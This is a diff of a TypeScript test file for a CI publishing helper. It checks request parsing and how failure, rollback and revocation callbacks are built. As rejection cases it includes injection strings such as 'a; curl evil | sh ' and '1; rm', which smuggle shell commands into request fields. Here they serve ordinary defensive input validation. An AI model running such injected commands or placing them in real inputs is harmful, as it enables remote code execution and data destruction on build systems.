@@ -1,10 +1,11 @@
 import { describe, expect, it } from 'vitest';
 import { buildCallback, describeFailure, parseRequest, prevManifestDecision, requestIdFrom, sourceGate, STEPS } from './ci';
 
-const good = { requestId: 'abcdefghij0123456789ab', kind: 'publish', collection: 'tales', docId: '12', versionId: '34' };
+const good = { requestId: 'abcdefghij0123456789ab', kind: 'publish', collection: 'tales', docId: '12', versionId: '34', attempt: 1 };
 
 describe('parseRequest：外來輸入逐欄驗格式', () => {
-  it('合格', () => expect(parseRequest(good)).toEqual({ id: good.requestId, kind: 'publish', collection: 'tales', docId: '12', versionId: '34' }));
+  it('合格', () => expect(parseRequest(good)).toEqual({ id: good.requestId, kind: 'publish', collection: 'tales', docId: '12', versionId: '34', attempt: 1 }));
+  it.each([0, 10, 1.5, '1; rm', undefined])('attempt %j → 拒絕', (attempt) => expect(() => parseRequest({ ...good, attempt })).toThrow(/attempt/));
   it('數字 id 也收（Payload 的 id 是數字）', () => expect(parseRequest({ ...good, docId: 12, versionId: 34 }).docId).toBe('12'));
   it.each([
     ['requestId 有分號', { requestId: 'a; curl evil | sh ' }],
@@ -53,8 +54,20 @@ describe('buildCallback：沒有正面證據就不能宣告成功', () => {
   it('什麼步驟都沒有紀錄（workflow 提早結束）→ 失敗（incomplete）', () => {
     expect(buildCallback({ ...args, steps: {} })).toMatchObject({ ok: false, check: 'incomplete' });
   });
-  it('失敗的回呼不帶 promoteKeys（沒上線就不能記成已 promote）', () => {
-    expect(buildCallback({ ...args, steps: { smoke: { outcome: 'failure' } } })).not.toHaveProperty('promoteKeys');
+  it('失敗的回呼也帶上這次實際搬到公開端的 key：沒記下來的 key 之後撤不掉', () => {
+    expect(buildCallback({ ...args, steps: { smoke: { outcome: 'failure' } } })).toMatchObject({ ok: false, promoteKeys: ['video/a/1080p.mp4'] });
+  });
+  it('smoke 失敗而回滾也失敗 → 指向 rollback（線上可能是壞的版本，不能說「維持上一版」）', () => {
+    expect(buildCallback({ ...args, steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'failure' }, rollback: { outcome: 'failure' } } }))
+      .toMatchObject({ ok: false, check: 'rollback' });
+  });
+  it('部署後被取消、回滾成功 → 失敗但不是 rollback', () => {
+    expect(buildCallback({ ...args, steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'cancelled' }, rollback: { outcome: 'success' } } }))
+      .toMatchObject({ ok: false, check: 'smoke' });
+  });
+  it('撤回中止的原因會帶給後台（要通知本人）', () => {
+    expect(buildCallback({ ...args, revokeAborted: '要撤回 9 個，超過上限 4', steps: { deploy: { outcome: 'success' }, smoke: { outcome: 'success' } } }))
+      .toMatchObject({ ok: true, revokeAborted: '要撤回 9 個，超過上限 4' });
   });
 });
 
